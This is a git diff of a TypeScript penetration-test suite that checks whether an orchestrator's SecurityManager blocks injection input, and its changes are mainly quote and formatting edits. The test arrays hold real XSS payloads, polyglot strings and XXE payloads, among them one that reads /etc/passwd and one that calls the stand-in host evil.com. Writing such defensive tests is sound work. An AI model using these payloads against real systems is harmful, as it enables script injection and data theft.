@@ -7,10 +7,10 @@
  */
 
 import {
-  SecurityManager,
+  AuthCredentials,
   SecurityContext,
   SecurityError,
-  AuthCredentials,
+  SecurityManager,
 } from "../../../src/orchestrator/SecurityManager";
 import { AgentProfile } from "../../../src/types/arbiter-orchestration";
 
@@ -73,43 +73,46 @@ describe("Penetration Testing - Injection Attacks", () => {
       "<script>alert`XSS`</script>",
 
       // Event handlers
-      '<img src=x onerror=alert(1)>',
-      '<body onload=alert(1)>',
-      '<svg onload=alert(1)>',
-      '<iframe onload=alert(1)></iframe>',
-      '<input onfocus=alert(1) autofocus>',
-      '<select onfocus=alert(1) autofocus>',
-      '<textarea onfocus=alert(1) autofocus>',
-      '<keygen onfocus=alert(1) autofocus>',
+      "<img src=x onerror=alert(1)>",
+      "<body onload=alert(1)>",
+      "<svg onload=alert(1)>",
+      "<iframe onload=alert(1)></iframe>",
+      "<input onfocus=alert(1) autofocus>",
+      "<select onfocus=alert(1) autofocus>",
+      "<textarea onfocus=alert(1) autofocus>",
+      "<keygen onfocus=alert(1) autofocus>",
       '<video><source onerror="alert(1)">',
-      '<audio src=x onerror=alert(1)>',
-      '<marquee onstart=alert(1)>',
+      "<audio src=x onerror=alert(1)>",
+      "<marquee onstart=alert(1)>",
 
       // JavaScript protocols
-      'javascript:alert(1)',
+      "javascript:alert(1)",
       'javascript:alert("XSS")',
       'javascript:eval("alert(1)")',
-      'jAvAsCrIpT:alert(1)', // Case variations
+      "jAvAsCrIpT:alert(1)", // Case variations
 
       // Data URIs
-      'data:text/html,<script>alert(1)</script>',
-      'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
+      "data:text/html,<script>alert(1)</script>",
+      "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
 
       // SVG-based
-      '<svg><script>alert(1)</script></svg>',
-      '<svg><g onload=alert(1)></svg>',
+      "<svg><script>alert(1)</script></svg>",
+      "<svg><g onload=alert(1)></svg>",
 
       // HTML5 vectors
       '<math><mi xlink:href="javascript:alert(1)">',
-      '<form><button formaction=javascript:alert(1)>X',
+      "<form><button formaction=javascript:alert(1)>X",
 
       // Encoded variants
-      '&lt;script&gt;alert(1)&lt;/script&gt;',
-      '%3Cscript%3Ealert(1)%3C/script%3E',
+      "&lt;script&gt;alert(1)&lt;/script&gt;",
+      "%3Cscript%3Ealert(1)%3C/script%3E",
     ];
 
     xssPayloads.forEach((payload, index) => {
-      it(`should handle XSS payload #${index + 1}: ${payload.substring(0, 50)}`, () => {
+      it(`should handle XSS payload #${index + 1}: ${payload.substring(
+        0,
+        50
+      )}`, () => {
         let blocked = false;
         try {
           securityManager.sanitizeInput(context, "test", { data: payload });
@@ -227,7 +230,7 @@ describe("Penetration Testing - Injection Attacks", () => {
     const xmlPayloads = [
       '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
       '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "http://evil.com">%xxe;]>',
-      '<![CDATA[<script>alert(1)</script>]]>',
+      "<![CDATA[<script>alert(1)</script>]]>",
     ];
 
     xmlPayloads.forEach((payload, index) => {
@@ -343,8 +346,8 @@ describe("Penetration Testing - Injection Attacks", () => {
 
   describe("Polyglot Attacks", () => {
     const polyglotPayloads = [
-      'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */onerror=alert(\'XSS\') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(\'XSS\')//></style></script></textarea></title>',
-      '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
+      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//></style></script></textarea></title>",
+      "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",
     ];
 
     polyglotPayloads.forEach((payload, index) => {
@@ -409,4 +412,3 @@ describe("Penetration Testing - Injection Attacks", () => {
     });
   });
 });
-
